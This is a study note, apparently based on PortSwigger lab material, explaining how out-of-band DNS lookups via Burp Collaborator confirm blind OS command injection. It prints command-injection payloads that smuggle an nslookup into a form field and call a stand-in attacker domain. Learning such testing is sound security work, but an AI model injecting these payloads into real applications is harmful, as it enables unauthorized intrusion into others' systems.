# Out-of-Band (OAST) Techniques

## Overview

Some Blind OS Command Injection vulnerabilities execute commands asynchronously.

In these situations:

- No command output is returned.
- Time delays may not be reliable.
- Output redirection may not be possible.

The PortSwigger material recommends using **Out-of-Band Application Security Testing (OAST)** techniques.

---

# How OAST Works

Instead of returning data to the browser, the injected command causes the server to communicate with an external system controlled by the tester.

If the interaction occurs, the injected command successfully executed.

---

# Example Payload

```bash
& nslookup kgji2ohoyw.web-attacker.com &
```

The server performs a DNS lookup for the specified domain.

If the attacker observes the DNS request, command execution is confirmed.

---

# Burp Collaborator

The PortSwigger labs use **Burp Collaborator** as the external system.

A unique Collaborator domain is generated.

Example payload:

```text
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
```

When the application executes the command, it performs a DNS lookup against the generated Collaborator domain.

---

# Attack Workflow

```
Inject nslookup Command

↓

Server Executes Command

↓

DNS Lookup Sent

↓

Burp Collaborator Receives Request

↓

Execution Confirmed
```

---

# Advantages

- Works when output is unavailable.
- Works when commands execute asynchronously.
- Does not require access to server files.

---

# Lab Objective

The PortSwigger lab requires triggering a DNS lookup to the default Burp Collaborator public server.

A successful lookup confirms that the injected command executed.

---

# Key Takeaways

- OAST confirms command execution through external network interactions.
- The PortSwigger labs use Burp Collaborator for this purpose.
- DNS lookups provide strong evidence of successful exploitation.